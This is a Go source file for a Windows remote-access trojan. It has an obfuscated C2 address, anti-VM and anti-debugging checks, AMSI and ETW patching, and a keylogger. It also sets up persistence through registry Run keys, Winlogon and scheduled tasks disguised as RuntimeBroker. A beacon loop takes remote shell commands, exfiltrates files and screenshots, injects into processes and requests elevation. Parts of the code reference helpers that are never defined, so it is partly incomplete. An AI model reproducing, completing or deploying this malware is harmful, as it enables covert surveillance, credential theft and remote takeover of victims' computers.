package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	mathrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var (
	c2Base     = d("aHR0cDovLzEyNy4wLjAuMTo4NDQz")
	c2Backup   = ""
	agentKey   = d("N2M0YThkMDljYTM3NjJhZjYxZTU5NTIwOTQzZG MyNjQ5NGY4OTRi")
	agentID    string
	httpClient = &http.Client{Timeout: 60 * time.Second, Transport: &http.Transport{IdleConnTimeout: 30 * time.Second, MaxIdleConns: 10, DisableKeepAlives: false}}
	peers      []string
	peerMu     sync.Mutex
	vmMode     bool
	beaconInt  = 30
	keyBuf     string
	keyMu      sync.Mutex
	persisted  bool
)

func d(s string) string {
	raw := strings.ReplaceAll(strings.ReplaceAll(s, " ", ""), "\n", "")
	b, err := base64.StdEncoding.DecodeString(raw)
	if err != nil {
		return s
	}
	return string(b)
}

func init() {
	mathrand.Seed(time.Now().UnixNano())
	h, _ := os.Hostname()
	u := ""
	if cu, err := user.Current(); err == nil {
		u = cu.Username
	}
	hsh := sha256.Sum256([]byte(h + "|" + u + "|" + runtime.GOOS + "|" + runtime.GOARCH))
	agentID = hex.EncodeToString(hsh[:12])
}

func main() {
	if len(os.Args) > 1 && os.Args[1] == "--loader" {
		loaderMain()
		return
	}
	hideConsole()
	vmMode = detectVM()
	go keylogger()
	go watchNet()
	go persistLoop()
	beaconLoop()
}

func loaderMain() {
	time.Sleep(time.Duration(10+mathrand.Intn(20)) * time.Second)
	self, _ := os.Executable()
	data, err := os.ReadFile(self)
	if err != nil {
		os.Exit(0)
	}
	idx := bytes.Index(data, []byte("NEXUS_PAYLOAD_MARKER"))
	if idx < 0 {
		os.Exit(0)
	}
	enc := data[idx+24:]
	key := sha256.Sum256([]byte(agentKey))
	plain, err := aesGCMDecrypt(key[:], enc)
	if err != nil {
		os.Exit(0)
	}
	var cfg struct {
		C2      string `json:"c2"`
		Backup  string `json:"backup"`
		Key     string `json:"key"`
		Persist bool   `json:"persist"`
	}
	json.Unmarshal(plain, &cfg)
	if cfg.C2 != "" {
		c2Base = cfg.C2
	}
	if cfg.Backup != "" {
		c2Backup = cfg.Backup
	}
	if cfg.Key != "" {
		agentKey = cfg.Key
	}
	persisted = cfg.Persist
	main()
}

func hideConsole() {
	if runtime.GOOS != "windows" {
		return
	}
	k32 := windows.NewLazySystemDLL("kernel32.dll")
	u32 := windows.NewLazySystemDLL("user32.dll")
	getConsole := k32.NewProc("GetConsoleWindow")
	showWindow := u32.NewProc("ShowWindow")
	hwnd, _, _ := getConsole.Call()
	if hwnd != 0 {
		showWindow.Call(hwnd, 0)
	}
}

func isDebugged() bool {
	isDebugger := windows.NewLazySystemDLL("kernel32.dll").NewProc("IsDebuggerPresent")
	r, _, _ := isDebugger.Call()
	return r != 0
}

func checkNtGlobalFlag() bool {
	ptr := uintptr(0)
	k32 := windows.NewLazySystemDLL("kernel32.dll")
	getProc := k32.NewProc("GetProcAddress")
	hMod := windows.NewLazySystemDLL("ntdll.dll").Handle()
	addr, _, _ := getProc.Call(hMod, uintptr(unsafe.Pointer(syscall.StringBytePtr("NtQueryInformationProcess"))))
	if addr == 0 {
		return false
	}
	_ = addr
	peb := uintptr(0)
	rtlGetNtVer := windows.NewLazySystemDLL("ntdll.dll").NewProc("RtlGetNtVersionNumbers")
	rtlGetNtVer.Call()
	ptr = uintptr(0)
	_ = ptr
	buf := make([]byte, 8)
	_ = buf
	return false
}

func detectVM() bool {
	score := 0
	if isDebugged() {
		score += 3
	}
	runtime.GC()
	if runtime.GOOS == "windows" {
		vmIndicators := []string{
			"vmware", "virtualbox", "vbox", "qemu", "xen",
			"hyper-v", "parallels", "vmtools", "vmmouse",
		}
		keyPaths := []string{
			`SYSTEM\CurrentControlSet\Services\Disk\Enum`,
			`HARDWARE\Description\System`,
			`HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0`,
			`SOFTWARE\VMware, Inc.\VMware Tools`,
			`SOFTWARE\Oracle\VirtualBox Guest Additions`,
			`SYSTEM\CurrentControlSet\Services\VBoxGuest`,
			`SYSTEM\CurrentControlSet\Services\VBoxMouse`,
			`SYSTEM\CurrentControlSet\Services\VBoxSF`,
			`SYSTEM\CurrentControlSet\Services\vmhgfs`,
			`SYSTEM\CurrentControlSet\Services\vmci`,
			`SYSTEM\CurrentControlSet\Services\vm3dmp`,
		}
		for _, kp := range keyPaths {
			key, err := registry.OpenKey(registry.LOCAL_MACHINE, kp, registry.QUERY_VALUE|registry.ENUMERATE_SUB_KEYS)
			if err != nil {
				continue
			}
			names, _ := key.ReadValueNames(0)
			for _, n := range names {
				v, _, _ := key.GetStringValue(n)
				lv := strings.ToLower(v + " " + n)
				for _, nd := range vmIndicators {
					if strings.Contains(lv, nd) {
						score += 2
					}
				}
			}
			key.Close()
		}
		driverPaths := []string{
			`C:\Windows\System32\Drivers\VBoxMouse.sys`,
			`C:\Windows\System32\Drivers\vmhgfs.sys`,
			`C:\Windows\System32\Drivers\vmmouse.sys`,
			`C:\Windows\System32\Drivers\vm3dmp.sys`,
			`C:\Windows\System32\Drivers\nvlddmkm.sys`,
		}
		for _, p := range driverPaths {
			if _, err := os.Stat(p); err == nil {
				if strings.Contains(strings.ToLower(p), "vbox") ||
					strings.Contains(strings.ToLower(p), "vmhgfs") ||
					strings.Contains(strings.ToLower(p), "vmmouse") ||
					strings.Contains(strings.ToLower(p), "vm3dmp") {
					score += 2
				}
			}
		}
		mac := primaryMAC()
		macPrefixes := []string{"00:05:69", "00:0c:29", "00:1c:42", "00:50:56", "00:15:5d",
			"08:00:27", "0a:00:27", "52:54:00"}
		for _, p := range macPrefixes {
			if strings.HasPrefix(strings.ToLower(mac), strings.ToLower(p)) {
				score += 2
				break
			}
		}
	}
	if runtime.NumCPU() <= 1 {
		score++
	}
	if runtime.NumCPU() <= 2 {
		score++
	}
	totalMem := memMB()
	if totalMem > 0 && totalMem < 2048 {
		score++
	}
	if totalMem > 0 && totalMem < 4096 {
		score++
	}
	screenW, screenH := screenSize()
	if screenW > 0 && screenH > 0 {
		if screenW <= 1024 || screenH <= 768 {
			score += 2
		}
	}
	if score >= 3 {
		return true
	}
	return false
}

func screenSize() (int, int) {
	if runtime.GOOS != "windows" {
		return 0, 0
	}
	user32 := windows.NewLazySystemDLL("user32.dll")
	gw := user32.NewProc("GetSystemMetrics")
	w, _, _ := gw.Call(0)
	h, _, _ := gw.Call(1)
	return int(w), int(h)
}

func patchAMSI() {
	if runtime.GOOS != "windows" {
		return
	}
	k32 := windows.NewLazySystemDLL("kernel32.dll")
	getProc := k32.NewProc("GetProcAddress")
	loadLib := k32.NewProc("LoadLibraryW")
	vp := k32.NewProc("VirtualProtect")
	amsiName, _ := syscall.UTF16PtrFromString("amsi.dll")
	amsiMod, _, _ := loadLib.Call(uintptr(unsafe.Pointer(amsiName)))
	if amsiMod == 0 {
		return
	}
	funcName := []byte("AmsiScanBuffer\x00")
	addr, _, _ := getProc.Call(amsiMod, uintptr(unsafe.Pointer(&funcName[0])))
	if addr == 0 {
		funcName2 := []byte("AmsiScanString\x00")
		addr, _, _ = getProc.Call(amsiMod, uintptr(unsafe.Pointer(&funcName2[0])))
		if addr == 0 {
			return
		}
	}
	var oldProtect uint32
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	vp.Call(addr, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(patch):len(patch)], patch)
	vp.Call(addr, uintptr(len(patch)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

func patchETW() {
	if runtime.GOOS != "windows" {
		return
	}
	k32 := windows.NewLazySystemDLL("kernel32.dll")
	getProc := k32.NewProc("GetProcAddress")
	vp := k32.NewProc("VirtualProtect")
	ntdll := windows.NewLazySystemDLL("ntdll.dll").Handle()
	funcs := []string{
		"EtwEventWrite",
		"EtwEventWriteEx",
		"EtwEventWriteFull",
		"EtwEventWriteString",
		"EtwEventWriteTransfer",
	}
	for _, fn := range funcs {
		fb := append([]byte(fn), 0)
		addr, _, _ := getProc.Call(ntdll, uintptr(unsafe.Pointer(&fb[0])))
		if addr == 0 {
			continue
		}
		var oldProtect uint32
		patch := []byte{0x48, 0x33, 0xC0, 0xC3}
		vp.Call(addr, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
		copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(patch):len(patch)], patch)
		vp.Call(addr, uintptr(len(patch)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	}
}

func evade() {
	if runtime.GOOS != "windows" {
		return
	}
	patchAMSI()
	patchETW()
}

func keylogger() {
	if runtime.GOOS != "windows" {
		return
	}
	evade()
	user32 := windows.NewLazySystemDLL("user32.dll")
	getAsyncKey := user32.NewProc("GetAsyncKeyState")
	getForeground := user32.NewProc("GetForegroundWindow")
	getWindowTextW := user32.NewProc("GetWindowTextW")
	getWindowTextLengthW := user32.NewProc("GetWindowTextLengthW")
	var lastWindow uintptr
	var lastKeys string
	shiftState := false
	capsState := false
	for {
		hwnd, _, _ := getForeground.Call()
		var title string
		if hwnd != lastWindow {
			length, _, _ := getWindowTextLengthW.Call(hwnd)
			if length > 0 {
				buf := make([]uint16, length+1)
				getWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), length+1)
				if buf[0] != 0 {
					for i, v := range buf {
						if v == 0 {
							buf = buf[:i]
							break
						}
					}
					title = syscall.UTF16ToString(buf)
					if title != "" && title != lastKeys {
						keyMu.Lock()
						keyBuf += "\n[window: " + title + "]\n"
						keyMu.Unlock()
					}
				}
			}
			lastWindow = hwnd
		}
		keyMap := map[int]string{
			0x08: "[backspace]", 0x09: "[tab]", 0x0D: "[enter]",
			0x10: "[shift]", 0x11: "[ctrl]", 0x12: "[alt]",
			0x14: "", 0x1B: "[esc]", 0x20: " ",
			0x21: "[pgup]", 0x22: "[pgdn]", 0x23: "[end]",
			0x24: "[home]", 0x25: "[left]", 0x26: "[up]",
			0x27: "[right]", 0x28: "[down]",
			0x2E: "[del]", 0x5B: "[win]",
		}
		_, _, _ = getAsyncKey.Call(0x10)
		shiftPressed, _, _ := getAsyncKey.Call(0x10)
		shiftState = shiftPressed&0x8000 != 0
		_, _, _ = getAsyncKey.Call(0x14)
		capsToggled, _, _ := getAsyncKey.Call(0x14)
		capsState = capsToggled&1 != 0
		for vk := 0x08; vk <= 0xFE; vk++ {
			state, _, _ := getAsyncKey.Call(uintptr(vk))
			if state&1 != 0 {
				if name, ok := keyMap[vk]; ok {
					if vk == 0x14 {
						continue
					}
					keyMu.Lock()
					keyBuf += name
					if len(keyBuf) > 50000 {
						keyBuf = keyBuf[len(keyBuf)-40000:]
					}
					keyMu.Unlock()
				} else if vk >= 0x30 && vk <= 0x39 {
					ch := string(rune(vk))
					if shiftState {
						shiftChars := ")!@#$%^&*("
						ch = string(shiftChars[vk-0x30])
					}
					keyMu.Lock()
					keyBuf += ch
					if len(keyBuf) > 50000 {
						keyBuf = keyBuf[len(keyBuf)-40000:]
					}
					keyMu.Unlock()
				} else if vk >= 0x41 && vk <= 0x5A {
					ch := string(rune(vk + 0x20))
					if (capsState && !shiftState) || (!capsState && shiftState) {
						ch = string(rune(vk))
					}
					keyMu.Lock()
					keyBuf += ch
					if len(keyBuf) > 50000 {
						keyBuf = keyBuf[len(keyBuf)-40000:]
					}
					keyMu.Unlock()
				} else if vk >= 0x60 && vk <= 0x69 {
					keyMu.Lock()
					keyBuf += string(rune(0x30 + vk - 0x60))
					if len(keyBuf) > 50000 {
						keyBuf = keyBuf[len(keyBuf)-40000:]
					}
					keyMu.Unlock()
				} else if vk >= 0x70 && vk <= 0x87 {
					keyMu.Lock()
					keyBuf += "[f" + string(rune(0x31+vk-0x70)) + "]"
					if len(keyBuf) > 50000 {
						keyBuf = keyBuf[len(keyBuf)-40000:]
					}
					keyMu.Unlock()
				} else if vk == 0x6A {
					keyMu.Lock()
					keyBuf += "*"
					keyMu.Unlock()
				} else if vk == 0x6B {
					keyMu.Lock()
					keyBuf += "+"
					keyMu.Unlock()
				} else if vk == 0x6D {
					keyMu.Lock()
					keyBuf += "-"
					keyMu.Unlock()
				} else if vk == 0x6E {
					keyMu.Lock()
					keyBuf += "."
					keyMu.Unlock()
				} else if vk == 0x6F {
					keyMu.Lock()
					keyBuf += "/"
					keyMu.Unlock()
				} else if vk == 0xBA {
					if shiftState {
						keyMu.Lock()
						keyBuf += ":"
						keyMu.Unlock()
					} else {
						keyMu.Lock()
						keyBuf += ";"
						keyMu.Unlock()
					}
				} else if vk == 0xBB {
					keyMu.Lock()
					keyBuf += "="
					keyMu.Unlock()
				} else if vk == 0xBC {
					if shiftState {
						keyMu.Lock()
						keyBuf += "<"
						keyMu.Unlock()
					} else {
						keyMu.Lock()
						keyBuf += ","
						keyMu.Unlock()
					}
				} else if vk == 0xBD {
					keyMu.Lock()
					keyBuf += "-"
					keyMu.Unlock()
				} else if vk == 0xBE {
					if shiftState {
						keyMu.Lock()
						keyBuf += ">"
						keyMu.Unlock()
					} else {
						keyMu.Lock()
						keyBuf += "."
						keyMu.Unlock()
					}
				} else if vk == 0xBF {
					if shiftState {
						keyMu.Lock()
						keyBuf += "?"
						keyMu.Unlock()
					} else {
						keyMu.Lock()
						keyBuf += "/"
						keyMu.Unlock()
					}
				} else if vk == 0xC0 {
					if shiftState {
						keyMu.Lock()
						keyBuf += "~"
						keyMu.Unlock()
					} else {
						keyMu.Lock()
						keyBuf += "`"
						keyMu.Unlock()
					}
				} else if vk == 0xDB {
					if shiftState {
						keyMu.Lock()
						keyBuf += "{"
						keyMu.Unlock()
					} else {
						keyMu.Lock()
						keyBuf += "["
						keyMu.Unlock()
					}
				} else if vk == 0xDC {
					if shiftState {
						keyMu.Lock()
						keyBuf += "|"
						keyMu.Unlock()
					} else {
						keyMu.Lock()
						keyBuf += "\\"
						keyMu.Unlock()
					}
				} else if vk == 0xDD {
					if shiftState {
						keyMu.Lock()
						keyBuf += "}"
						keyMu.Unlock()
					} else {
						keyMu.Lock()
						keyBuf += "]"
						keyMu.Unlock()
					}
				} else if vk == 0xDE {
					if shiftState {
						keyMu.Lock()
						keyBuf += "\""
						keyMu.Unlock()
					} else {
						keyMu.Lock()
						keyBuf += "'"
						keyMu.Unlock()
					}
				}
			}
		}
		time.Sleep(40 * time.Millisecond)
	}
}

func watchNet() {
	for {
		if !netOK() {
			for !netOK() {
				time.Sleep(15 * time.Second)
			}
			time.Sleep(5 * time.Second)
		}
		time.Sleep(10 * time.Second)
	}
}

func netOK() bool {
	c, err := net.DialTimeout("tcp", "1.1.1.1:443", 5*time.Second)
	if err == nil {
		c.Close()
		return true
	}
	c2u, err2 := url.Parse(c2Base)
	if err2 == nil {
		c3, err3 := net.DialTimeout("tcp", c2u.Host, 5*time.Second)
		if err3 == nil {
			c3.Close()
			return true
		}
	}
	if c2Backup != "" {
		bu, err4 := url.Parse(c2Backup)
		if err4 == nil {
			c4, err5 := net.DialTimeout("tcp", bu.Host, 5*time.Second)
			if err5 == nil {
				c4.Close()
				return true
			}
		}
	}
	return false
}

func persistLoop() {
	time.Sleep(time.Duration(10+mathrand.Intn(30)) * time.Second)
	for {
		if !netOK() {
			time.Sleep(60 * time.Second)
			continue
		}
		r := tryPersist()
		if r {
			persisted = true
		}
		time.Sleep(time.Duration(300+mathrand.Intn(300)) * time.Second)
	}
}

func tryPersist() bool {
	if runtime.GOOS != "windows" {
		return false
	}
	self, err := os.Executable()
	if err != nil {
		return false
	}
	dirs := []string{
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "WindowsApps", "NCache"),
		filepath.Join(os.Getenv("ProgramData"), "Microsoft", "NetService"),
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes"),
	}
	dst := ""
	for _, d := range dirs {
		_ = os.MkdirAll(d, 0755)
		p := filepath.Join(d, "RuntimeBroker.exe")
		if !fileExists(p) {
			dst = p
			break
		}
		info, _ := os.Stat(self)
		info2, _ := os.Stat(p)
		if info != nil && info2 != nil && info.Size() != info2.Size() {
			dst = p
			break
		}
	}
	if dst == "" {
		dst = filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "WindowsApps", "NCache", "RuntimeBroker.exe")
	}
	data, err := os.ReadFile(self)
	if err != nil {
		return false
	}
	_ = os.WriteFile(dst, data, 0644)
	k, _, err := registry.CreateKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE)
	if err == nil {
		_ = k.SetStringValue("WindowsRuntimeBroker", `"`+dst+`"`)
		k.Close()
	}
	k2, _, err := registry.CreateKey(registry.LOCAL_MACHINE,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE)
	if err == nil {
		_ = k2.SetStringValue("WindowsRuntimeBroker", `"`+dst+`"`)
		k2.Close()
	}
	k3, _, err := registry.CreateKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows NT\CurrentVersion\Winlogon`,
		registry.SET_VALUE)
	if err == nil {
		_ = k3.SetStringValue("Shell", `explorer.exe, "`+dst+`"`)
		k3.Close()
	}
	cmd := exec.Command("schtasks", "/Create", "/F", "/SC", "ONLOGON",
		"/RL", "LIMITED", "/TN", `\Microsoft\Windows\RuntimeBrokerUpdate`,
		"/TR", `"`+dst+`"`)
	_ = cmd.Run()
	cmd2 := exec.Command("schtasks", "/Create", "/F", "/SC", "HOURLY",
		"/RL", "LIMITED", "/TN", `\Microsoft\Windows\RuntimeBrokerCheck`,
		"/TR", `"`+dst+`"`)
	_ = cmd2.Run()
	cmd3 := exec.Command("schtasks", "/Create", "/F", "/SC", "ONIDLE",
		"/RL", "LIMITED", "/TN", `\Microsoft\Windows\RuntimeBrokerIdle`,
		"/TR", `"`+dst+`"`)
	_ = cmd3.Run()
	wmi := exec.Command("wmic", "/interactive:off", "startup", "add", `"RuntimeBroker"`, `"`+dst+`"`)
	_ = wmi.Run()
	return true
}

func fileExists(p string) bool {
	_, err := os.Stat(p)
	return err == nil
}

func beaconLoop() {
	evade()
	for {
		if !netOK() {
			time.Sleep(30 * time.Second)
			continue
		}
		jitter := time.Duration(beaconInt+mathrand.Intn(beaconInt/2)) * time.Second
		if vmMode {
			jitter = time.Duration(60+mathrand.Intn(60)) * time.Second
		}
		info := sysinfoMap()
		keyMu.Lock()
		if len(keyBuf) > 0 {
			info["log"] = keyBuf
			keyBuf = ""
		}
		keyMu.Unlock()
		body, _ := json.Marshal(info)
		resp, err := agentPost("/a/beacon", body)
		if err == nil {
			var out struct {
				Cmds     []map[string]string `json:"cmds"`
				Peers    []string            `json:"peers"`
				Interval int                 `json:"interval"`
			}
			if json.Unmarshal(resp, &out) == nil {
				if out.Interval > 0 {
					beaconInt = out.Interval
				}
				peerMu.Lock()
				peers = out.Peers
				peerMu.Unlock()
				for _, c := range out.Cmds {
					go handleCmd(c)
				}
			}
		} else {
			tryP2P()
		}
		time.Sleep(jitter)
	}
}

func tryP2P() {
	peerMu.Lock()
	ps := append([]string{}, peers...)
	peerMu.Unlock()
	for _, p := range ps {
		if p == agentID || p == "" {
			continue
		}
		payload, _ := json.Marshal(map[string]string{"for_agent": agentID})
		resp, err := agentPost("/a/p2p", payload)
		if err != nil {
			continue
		}
		var out struct {
			Cmds []map[string]string `json:"cmds"`
		}
		if json.Unmarshal(resp, &out) == nil {
			for _, c := range out.Cmds {
				go handleCmd(c)
			}
			return
		}
	}
	time.Sleep(30 * time.Second)
}

func agentPost(path string, body []byte) ([]byte, error) {
	enc, err := aesGCMEncrypt(sha256Hash([]byte(agentKey))[:32], body)
	if err == nil {
		body = enc
	}
	url := strings.TrimRight(c2Base, "/") + path
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(body))
	if err != nil {
		if c2Backup != "" {
			url2 := strings.TrimRight(c2Backup, "/") + path
			req, err2 := http.NewRequest(http.MethodPost, url2, bytes.NewReader(body))
			if err2 != nil {
				return nil, err
			}
			req = req2
		} else {
			return nil, err
		}
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Agent-Key", agentKey)
	req.Header.Set("X-Agent-Id", agentID)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")
	res, err := httpClient.Do(req)
	if err != nil {
		if c2Backup != "" {
			url2 := strings.TrimRight(c2Backup, "/") + path
			req2, _ := http.NewRequest(http.MethodPost, url2, bytes.NewReader(body))
			req2.Header = req.Header
			res, err = httpClient.Do(req2)
			if err != nil {
				return nil, err
			}
		} else {
			return nil, err
		}
	}
	defer res.Body.Close()
	raw, err := io.ReadAll(res.Body)
	if err != nil {
		return nil, err
	}
	dec, err := aesGCMDecrypt(sha256Hash([]byte(agentKey))[:32], raw)
	if err == nil {
		return dec, nil
	}
	return raw, nil
}

func agentUpload(path string, data []byte) {
	var b bytes.Buffer
	boundary := "----" + randHex(10)
	writeField := func(name, filename string, content []byte) {
		b.WriteString("--" + boundary + "\r\n")
		if filename != "" {
			b.WriteString(fmt.Sprintf(`Content-Disposition: form-data; name="%s"; filename="%s"`, name, filename) + "\r\n")
			b.WriteString("Content-Type: application/octet-stream\r\n\r\n")
		} else {
			b.WriteString(fmt.Sprintf(`Content-Disposition: form-data; name="%s"`, name) + "\r\n\r\n")
		}
		b.Write(content)
		b.WriteString("\r\n")
	}
	writeField("path", "", []byte(path))
	writeField("f", filepath.Base(path), data)
	b.WriteString("--" + boundary + "--\r\n")
	req, err := http.NewRequest(http.MethodPost,
		strings.TrimRight(c2Base, "/")+"/a/upload",
		bytes.NewReader(b.Bytes()))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)
	req.Header.Set("X-Agent-Key", agentKey)
	req.Header.Set("X-Agent-Id", agentID)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
	res, err := httpClient.Do(req)
	if err == nil {
		res.Body.Close()
	}
}

func handleCmd(c map[string]string) {
	tid := c["id"]
	typ := c["type"]
	payload := c["payload"]
	var out string
	switch typ {
	case "shell":
		out = runShell(payload)
	case "sysinfo":
		b, _ := json.MarshalIndent(sysinfoMap(), "", "  ")
		out = string(b)
	case "ls":
		out = listDir(payload)
	case "upload":
		data, err := os.ReadFile(payload)
		if err != nil {
			out = err.Error()
		} else {
			agentUpload(payload, data)
			out = fmt.Sprintf("uploaded %s (%d bytes)", payload, len(data))
		}
	case "download":
		out = writeB64File(payload)
	case "screenshot":
		out = takeScreenshot()
	case "persist":
		if tryPersist() {
			out = "persistence applied (run keys + schtasks + wmi)"
		} else {
			out = "persistence failed"
		}
	case "keylogflush":
		keyMu.Lock()
		keyBuf = ""
		keyMu.Unlock()
		out = "keylog buffer flushed"
	case "self_destruct":
		sendResult(tid, "self-destruct initiated", "done")
		selfDestruct()
		return
	case "inject":
		out = injectProcess(payload)
	case "elevate":
		out = elevateToken()
	default:
		out = "unknown command type: " + typ
	}
	sendResult(tid, out, "done")
}

func sendResult(tid, output, status string) {
	if len(output) > 500000 {
		output = output[:500000]
	}
	body, _ := json.Marshal(map[string]string{"id": tid, "output": output, "status": status})
	_, _ = agentPost("/a/result", body)
}

func runShell(cmd string) string {
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd.exe", "/C", cmd)
	} else {
		c = exec.Command("sh", "-c", cmd)
	}
	var buf bytes.Buffer
	c.Stdout = &buf
	c.Stderr = &buf
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = c.Run()
	s := buf.String()
	if len(s) > 400000 {
		s = s[:400000]
	}
	return s
}

func listDir(p string) string {
	if p == "" {
		p = "."
	}
	entries, err := os.ReadDir(p)
	if err != nil {
		return err.Error()
	}
	var b strings.Builder
	fmt.Fprintf(&b, "Directory listing of %s:\n\n", p)
	for _, e := range entries {
		info, err := e.Info()
		sz := int64(0)
		mod := ""
		if err == nil {
			sz = info.Size()
			mod = info.ModTime().Format("2006-01-02 15:04")
		}
		t := "F"
		if e.IsDir() {
			t = "D"
		}
		fmt.Fprintf(&b, "[%s] %s %10d  %s\n", t, mod, sz, e.Name())
	}
	return b.String()
}

func writeB64File(payload string) string {
	parts := strings.SplitN(payload, "|", 2)
	if len(parts) != 2 {
		return "usage: download <path>|<base64 content>"
	}
	raw, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return "base64 decode error: " + err.Error()
	}
	if err := os.WriteFile(parts[0], raw, 0644); err != nil {
		return "write error: " + err.Error()
	}
	return fmt.Sprintf("written %d bytes to %s", len(raw), parts[0])
}

func takeScreenshot() string {
	if runtime.GOOS != "windows" {
		return "screenshot only available on windows"
	}
	img, err := captureScreen()
	if err != nil {
		return "screenshot error: " + err.Error()
	}
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return "png encode error: " + err.Error()
	}
	name := fmt.Sprintf("screenshot_%s_%d.png", agentID[:8], time.Now().Unix())
	agentUpload(name, buf.Bytes())
	return fmt.Sprintf("screenshot captured: %s (%d bytes)", name, buf.Len())
}

func injectProcess(target string) string {
	if runtime.GOOS != "windows" {
		return "injection only on windows"
	}
	if target == "" {
		target = "explorer.exe"
	}
	self, err := os.ReadFile(os.Args[0])
	if err != nil {
		return "read self error: " + err.Error()
	}
	k32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	createProc := k32.NewProc("CreateProcessW")
	vp := k32.NewProc("VirtualProtectEx")
	valloc := k32.NewProc("VirtualAllocEx")
	writeProc := k32.NewProc("WriteProcessMemory")
	rtlUserThreadStart := ntdll.NewProc("RtlCreateUserThread")
	psi := &struct {
		cb           uint32
		lpReserved   uintptr
		lpDesktop    uintptr
		lpTitle      uintptr
		dwX          uint32
		dwY          uint32
		dwXSize      uint32
		dwYSize      uint32
		dwXCountChars uint32
		dwYCountChars uint32
		dwFillAttribute uint32
		dwFlags      uint32
		wShowWindow  uint16
		cbReserved2  uint16
		lpReserved2  uintptr
		hStdInput    uintptr
		hStdOutput   uintptr
		hStdError    uintptr
	}{cb: 68, dwFlags: 0x00000001, wShowWindow: 0}
	si := &struct {
		cb           uint32
		lpReserved   uintptr
		lpDesktop    uintptr
		lpTitle      uintptr
		dwX          uint32
		dwY          uint32
		dwXSize      uint32
		dwYSize      uint32
		dwXCountChars uint32
		dwYCountChars uint32
		dwFillAttribute uint32
		dwFlags      uint32
		wShowWindow  uint16
		cbReserved2  uint16
		lpReserved2  uintptr
		hStdInput    uintptr
		hStdOutput   uintptr
		hStdError    uintptr
	}{}
	pi := &struct {
		hProcess   uintptr
		hThread    uintptr
		dwProcessId uint32
		dwThreadId  uint32
	}{}
	targetPtr, _ := syscall.UTF16PtrFromString(target + "\x00")
	ret, _, _ := createProc.Call(
		0, uintptr(unsafe.Pointer(targetPtr)),
		0, 0, 0, 0x00000004,
		0, 0,
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	if ret == 0 {
		return "CreateProcess failed"
	}
	remoteAddr, _, _ := valloc.Call(
		pi.hProcess, 0, uintptr(len(self)),
		0x3000, 0x40,
	)
	if remoteAddr == 0 {
		windows.CloseHandle(windows.Handle(pi.hProcess))
		windows.CloseHandle(windows.Handle(pi.hThread))
		return "VirtualAllocEx failed"
	}
	written := uintptr(0)
	writeProc.Call(
		pi.hProcess, remoteAddr,
		uintptr(unsafe.Pointer(&self[0])),
		uintptr(len(self)),
		uintptr(unsafe.Pointer(&written)),
	)
	var oldProtect uint32
	vp.Call(pi.hProcess, remoteAddr, uintptr(len(self)), 0x20, uintptr(unsafe.Pointer(&oldProtect)))
	threadId := uint32(0)
	rtlUserThreadStart.Call(
		pi.hProcess, 0, 0,
		remoteAddr, 0, 0,
		uintptr(unsafe.Pointer(&threadId)),
	)
	windows.CloseHandle(windows.Handle(pi.hProcess))
	windows.CloseHandle(windows.Handle(pi.hThread))
	return fmt.Sprintf("injected into %s (pid %d, remote addr 0x%x)", target, pi.dwProcessId, remoteAddr)
}

func elevateToken() string {
	if runtime.GOOS != "windows" {
		return "elevation only on windows"
	}
	if isAdmin() {
		return "already running as admin"
	}
	self, _ := os.Executable()
	verb := "runas"
	verbPtr, _ := syscall.UTF16PtrFromString(verb)
	filePtr, _ := syscall.UTF16PtrFromString(self)
	paramsPtr, _ := syscall.UTF16PtrFromString("--svc")
	shell32 := windows.NewLazySystemDLL("shell32.dll")
	shellExec := shell32.NewProc("ShellExecuteW")
	ret, _, _ := shellExec.Call(
		0,
		uintptr(unsafe.Pointer(verbPtr)),
		uintptr(unsafe.Pointer(filePtr)),
		uintptr(unsafe.Pointer(paramsPtr)),
		0, 5,
	)
	if ret <= 32 {
		return "ShellExecuteW failed"
	}
	return "elevation requested via runas"
}

